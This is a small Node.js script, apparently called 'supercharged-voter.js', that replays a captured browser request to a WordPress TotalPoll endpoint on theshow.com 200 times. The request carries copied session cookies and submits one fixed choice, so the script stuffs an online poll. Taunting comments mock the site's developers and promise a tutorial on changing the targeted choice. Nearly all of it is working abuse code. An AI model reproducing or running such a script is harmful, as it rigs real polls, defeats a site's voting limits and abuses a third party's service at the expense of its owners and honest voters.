// we do a little trolling
// fix your shit sds
// tutorial on how to change who to vote for coming soon

const fetch = require("node-fetch");
console.log("[supercharged-voter.js]: starting...")

function repeat(func, times) {
  func()
  times && --times && repeat(func, times)
}

repeat(function() { fetch("https://theshow.com/wp-admin/admin-ajax.php?action=totalpoll", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryVOEA8ebhQS4LFzBf",
    "sec-ch-ua": "\"Brave\";v=\"113\", \"Chromium\";v=\"113\", \"Not-A.Brand\";v=\"24\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1",
    "x-requested-with": "XMLHttpRequest",
    "cookie": "AWSALBTG=OAgI3hiFjwl/kxitrywG4mU4lc3Mo9jO/p1YqMIhmqYfOamCLdvEDVPbEOXzIQn4nurik/z4cXBHfEOBNMXb4dMzQcCFxDM0iG0dL6XShIFvzWA2HpLsnld7dQYjTp+9Lyt7lQHDAx9LSX5HG/z2pkuUn1B6ObRST90mKv/Vu+23PRKWHUU=; AWSALBTGCORS=OAgI3hiFjwl/kxitrywG4mU4lc3Mo9jO/p1YqMIhmqYfOamCLdvEDVPbEOXzIQn4nurik/z4cXBHfEOBNMXb4dMzQcCFxDM0iG0dL6XShIFvzWA2HpLsnld7dQYjTp+9Lyt7lQHDAx9LSX5HG/z2pkuUn1B6ObRST90mKv/Vu+23PRKWHUU=",
    "Referer": "https://theshow.com/supercharged/",
    "Referrer-Policy": "strict-origin-when-cross-origin"
  },
  "body": "------WebKitFormBoundaryVOEA8ebhQS4LFzBf\r\nContent-Disposition: form-data; name=\"totalpoll[choices][550a43df-d9d8-4524-a86b-566cd939de92][]\"\r\n\r\n4239c7a9-0f5b-4520-a5bf-60285e61e87b\r\n------WebKitFormBoundaryVOEA8ebhQS4LFzBf\r\nContent-Disposition: form-data; name=\"totalpoll[screen]\"\r\n\r\nvote\r\n------WebKitFormBoundaryVOEA8ebhQS4LFzBf\r\nContent-Disposition: form-data; name=\"totalpoll[pollId]\"\r\n\r\n11832\r\n------WebKitFormBoundaryVOEA8ebhQS4LFzBf\r\nContent-Disposition: form-data; name=\"totalpoll[action]\"\r\n\r\nvote\r\n------WebKitFormBoundaryVOEA8ebhQS4LFzBf--\r\n",
  "method": "POST"
});
}, 200);

console.log("[supercharged-voter.js]: finished (on your mother)")
